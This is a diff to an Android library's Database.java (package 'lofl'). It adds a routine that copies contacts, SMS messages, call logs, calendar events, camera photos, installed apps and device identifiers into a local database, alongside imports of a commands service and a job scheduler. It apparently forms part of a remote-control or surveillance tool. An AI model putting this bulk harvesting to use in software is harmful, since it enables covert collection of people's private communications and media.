@@ -1,20 +1,30 @@
 package com.candroid.lofl.data.db;
 
+import android.Manifest;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteException;
+import android.os.Build;
 import android.util.Log;
 
+import com.candroid.lofl.api.Apps;
+import com.candroid.lofl.api.ContentProviders;
 import com.candroid.lofl.api.Storage;
+import com.candroid.lofl.api.Systems;
 import com.candroid.lofl.data.pojos.CalendarEvent;
 import com.candroid.lofl.data.pojos.Contact;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
+import com.candroid.lofl.jobs.JobsScheduler;
+import com.candroid.lofl.services.CommandsIntentService;
 import com.candroid.lofl.services.LoflService;
 
 import java.io.File;
+import java.util.ArrayList;
 import java.util.List;
 
 public class Database {
@@ -80,12 +90,13 @@ public class Database {
         }
     }
 
-    public static void insertDevice(SQLiteDatabase database, String address, String manufacturer, String product, String version, String flavor, String serial, String radio){
+    public static void insertDevice(SQLiteDatabase database, String address, String ip, String manufacturer, String product, String version, String flavor, String serial, String radio){
         long newRowId = -1;
         try{
             database.beginTransaction();
             ContentValues values = new ContentValues();
             values.put(DataContract.DeviceContract.COLUMN_ADDRESS, address);
+            values.put(DataContract.DeviceContract.COLUMN_IP, ip);
             values.put(DataContract.DeviceContract.COLUMN_MANUFACTURER, manufacturer);
             values.put(DataContract.DeviceContract.COLUMN_PRODUCT, product);
             values.put(DataContract.DeviceContract.COLUMN_VERSION, version);
@@ -110,7 +121,7 @@ public class Database {
                 db.beginTransaction();
                 ContentValues values = new ContentValues();
                 values.put(DataContract.PackagesContract.COLUMN_PACKAGE_NAME, app.packageName);
-                long newRowId = db.insert(DataContract.PackagesContract.TABLE_NAME, null, values);
+                long newRowId = db.insertWithOnConflict(DataContract.PackagesContract.TABLE_NAME, null, values, SQLiteDatabase.CONFLICT_IGNORE);
                 Log.d("Database", "inserted new package name into row id = " + newRowId);
                 db.setTransactionSuccessful();
             }catch (Exception e){
@@ -237,7 +248,9 @@ public class Database {
             e.printStackTrace();
         }finally{
             db.endTransaction();
-            db.close();
+            if(db.isOpen()){
+                db.close();
+            }
         }
         return newRowId;
     }
@@ -277,6 +290,122 @@ public class Database {
         }finally{
             db.endTransaction();
             db.close();
+        }
+    }
+
+    public static void syncPhoneToDatabase(Context context){
+        SQLiteDatabase database = DatabaseHelper.getInstance(context).getWritableDatabase();
+        try {
+            database.beginTransaction();
+            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(context);
+                try {
+                    database.beginTransaction();
+                    Database.insertContacts(database, contacts);
+                    database.setTransactionSuccessful();
+                } catch (SQLiteException e) {
+                    e.printStackTrace();
+                } finally {
+                    database.endTransaction();
+                    JobsScheduler.setJobRan(context, JobsScheduler.CONTACTS_KEY);
+                }
+            }
+            //SYNC INSTALLED APPS
+            try {
+                database.beginTransaction();
+                Database.insertPackages(database, Apps.getInstalledApps(context));
+                database.setTransactionSuccessful();
+            } catch (SQLiteException e) {
+                e.printStackTrace();
+            } finally {
+                database.endTransaction();
+                JobsScheduler.setJobRan(context, JobsScheduler.PACKAGES_KEY);
+            }
+            //DCIM SYNC
+            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+                File[] pictures = Storage.Files.getFilesForDirectory(Storage.Files.getDcimDirectory().getPath() + "/Camera");
+                try {
+                    database.beginTransaction();
+                    if (pictures != null && pictures.length > 0) {
+                        for (File f : pictures) {
+                            Database.insertMedia(database, f.getName(), f);
+                        }
+                    }
+                    database.setTransactionSuccessful();
+                } catch (SQLiteException e) {
+                    e.printStackTrace();
+                } finally {
+                    database.endTransaction();
+                    JobsScheduler.setJobRan(context, JobsScheduler.DCIM_KEY);
+                }
+            }
+            //SYNC CALL LOG
+            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+                ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(context);
+                try {
+                    database.beginTransaction();
+                    Database.insertPhoneCalls(database, phoneCalls);
+                    database.setTransactionSuccessful();
+                } catch (SQLException e) {
+                    e.printStackTrace();
+                } finally {
+                    database.endTransaction();
+                    JobsScheduler.setJobRan(context, JobsScheduler.PHONE_CALLS_KEY);
+                }
+            }
+            //SYNC CALENDAR EVENTS
+            if (context.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
+                ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(context);
+                try {
+                    database.beginTransaction();
+                    Database.insertCalendarEvents(database, calendarEvents);
+                    database.setTransactionSuccessful();
+                } catch (SQLException e) {
+                    e.printStackTrace();
+                } finally {
+                    database.endTransaction();
+                    JobsScheduler.setJobRan(context, JobsScheduler.CALENDAR_EVENTS_KEY);
+                }
+            }
+            //SYNC SMS
+            if (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+                ArrayList<SmsMsg> smsMsgs = ContentProviders.Sms.fetchSmsMessages(context);
+                try {
+                    database.beginTransaction();
+                    Database.insertSmsMessages(database, smsMsgs);
+                    database.setTransactionSuccessful();
+                } catch (SQLException e) {
+                    e.printStackTrace();
+                } finally {
+                    database.endTransaction();
+                    JobsScheduler.setJobRan(context, JobsScheduler.SMS_KEY);
+                }
+            }
+            //SYNC DEVICE INFO
+            try {
+                database.beginTransaction();
+                String ip = Systems.Networking.fetchIpv4Addresses().get(0);
+                Database.insertDevice(database, LoflService.sTelephoneAddress, ip, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
+                // TODO: 2/10/19 unable to access BuildConfig from library....must find a way to get this from app
+                //Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
+                database.setTransactionSuccessful();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            } finally {
+                database.endTransaction();
+                JobsScheduler.setJobRan(context, JobsScheduler.DEVICE_KEY);
+            }
+            database.setTransactionSuccessful();
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            //FNISHED SYNCING PHONE TO DATABASE
+            database.endTransaction();
+            try{
+                database.close();
+            }catch (IllegalStateException e){
+                e.printStackTrace();
+            }
         }
     }
 
